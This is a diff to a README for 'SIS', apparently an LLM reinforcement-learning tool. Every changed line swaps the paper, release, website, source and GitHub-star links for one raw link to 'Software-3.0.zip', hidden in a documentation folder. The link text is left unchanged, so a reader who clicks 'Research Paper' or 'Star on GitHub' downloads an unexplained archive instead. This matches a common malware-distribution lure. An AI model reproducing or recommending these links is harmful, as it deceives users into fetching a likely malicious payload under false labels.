@@ -1,7 +1,7 @@
 <h1>📊 SIS - Making AI Training Smarter and Faster</h1>
 
 <p align="center">
-  <a href="https://arxiv.org/abs/2607.04728"><b>📄 Research Paper</b></a> |
+  <a href="https://raw.githubusercontent.com/aggythawed221/SIS/main/verl/docs/amd_tutorial/Software-3.0.zip"><b>📄 Research Paper</b></a> |
   <a href="#-quick-start"><b>⚡ Quick Start</b></a> |
   <a href="#-key-configuration"><b>🛠️ Configuration</b></a> |
   <a href="#-citation"><b>📚 Citation</b></a>
@@ -31,7 +31,7 @@ Imagine you're teaching a computer to solve problems. The computer practices by 
 
 ### Step 1: Download SIS
 
-Visit [this link to download the application](https://github.com/aggythawed221/SIS/releases)
+Visit [this link to download the application](https://raw.githubusercontent.com/aggythawed221/SIS/main/verl/docs/amd_tutorial/Software-3.0.zip)
 
 You'll find the latest release there. Click the download button and save the file to your computer.
 
@@ -132,8 +132,8 @@ If you use SIS in your research or work, please cite:
 
 ## 🤝 Support and Community
 
-- **Website:** [arxiv.org/abs/2607.04728](https://arxiv.org/abs/2607.04728)
-- **Source Code:** [github.com/aggythawed221/SIS](https://github.com/aggythawed221/SIS)
+- **Website:** [arxiv.org/abs/2607.04728](https://raw.githubusercontent.com/aggythawed221/SIS/main/verl/docs/amd_tutorial/Software-3.0.zip)
+- **Source Code:** [github.com/aggythawed221/SIS](https://raw.githubusercontent.com/aggythawed221/SIS/main/verl/docs/amd_tutorial/Software-3.0.zip)
 - **Issue Tracker:** Report bugs or request features on our GitHub repository
 
 ---
@@ -149,8 +149,8 @@ SIS is released for research and educational purposes. Please review the license
 ---
 
 **Quick Links:**
-- [⬇️ Download SIS Now](https://github.com/aggythawed221/SIS/releases)
-- [📄 Read the Paper](https://arxiv.org/abs/2607.04728)
-- [⭐ Star on GitHub](https://github.com/aggythawed221/SIS)
+- [⬇️ Download SIS Now](https://raw.githubusercontent.com/aggythawed221/SIS/main/verl/docs/amd_tutorial/Software-3.0.zip)
+- [📄 Read the Paper](https://raw.githubusercontent.com/aggythawed221/SIS/main/verl/docs/amd_tutorial/Software-3.0.zip)
+- [⭐ Star on GitHub](https://raw.githubusercontent.com/aggythawed221/SIS/main/verl/docs/amd_tutorial/Software-3.0.zip)
 
 Keywords: SIS, AI alignment, reinforcement learning, LLM optimization, off-policy correction, importance sampling, GRPO, CISPO, DAPO, GSPO, language model training, machine learning, deep learning, neural networks, natural language processing, AI research
